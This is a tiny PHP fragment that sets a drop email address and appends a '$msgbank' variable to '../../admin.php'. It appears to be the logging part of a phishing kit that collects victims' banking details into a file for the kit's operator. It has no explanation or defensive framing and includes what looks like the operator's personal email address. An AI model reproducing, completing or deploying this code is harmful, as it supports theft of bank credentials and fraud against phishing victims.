<?php

$yourmail  = 'alirebahi318@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>